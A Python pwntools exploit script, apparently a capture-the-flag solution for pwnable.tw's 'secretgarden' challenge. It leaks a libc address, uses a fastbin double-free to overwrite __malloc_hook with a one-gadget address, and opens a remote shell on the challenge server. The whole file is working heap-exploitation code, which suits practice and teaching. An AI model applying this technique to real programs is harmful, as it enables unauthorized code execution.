from pwn import *

#context.log_level = 'debug'

def raisef(length, name, color):
	p.sendlineafter('Your choice :', '1')

	p.sendlineafter('Length of the name :', str(length))
	p.sendafter('The name of flower :', str(name))
	p.sendlineafter('The color of the flower :', str(color))

def visit():
	p.sendlineafter('Your choice :', '2')


def remove(garden):
	p.sendlineafter('Your choice :', '3')

	p.sendlineafter('Which flower do you want to remove from the garden:', str(garden))

def clean():
	p.sendlineafter('Your choice :', '4')


def leave():
	p.sendlineafter('Your choice :', '5')


#p = process('./secretgarden')
p = remote('chall.pwnable.tw',10203)
e = ELF('./secretgarden')
#l = e.libc
l = ELF('./libc_64.so.6')


raisef(0x28, 't', 'tt')
raisef(0x100, 'a', 'aa')
raisef(300, 'a', 'aa')

remove(0) # to prevent : spilit unsorted bin 
remove(1)

raisef(0x100, 'a' * 8, 'bb') 

visit()
libc = u64(p.recvuntil('\x7f')[-6:].ljust(8, '\x00')) - 88 - 16 - l.sym['__malloc_hook']
log.info('libc : ' + hex(libc))
__malloc_hook = libc + l.sym['__malloc_hook']
log.info('__malloc_hook : ' + hex(__malloc_hook))


#### fastbin dup 
fastbin_dup_size = 0x7f - 16 - 8
raisef(fastbin_dup_size, 'a', 'aa')
raisef(fastbin_dup_size, 'b', 'bb')
raisef(fastbin_dup_size, 'b', 'bb')

remove(4)
remove(5)
remove(4)

raisef(fastbin_dup_size, p64(__malloc_hook - 27 - 8), 'aa')
log.info('fast bin dup chunk at : ' + hex(__malloc_hook - 27 - 8))
raisef(fastbin_dup_size, 'b', 'b')
raisef(fastbin_dup_size, 'c', 'b')
raisef(fastbin_dup_size, 'a' * (27 + 8 - 16) +p64(libc + 0xef6c4), 'b')
#raisef(fastbin_dup_size, 'a' * (27 + 8 - 16) +p64(libc + l.sym['system']), 'b')

remove(4)
remove(4)

p.interactive()
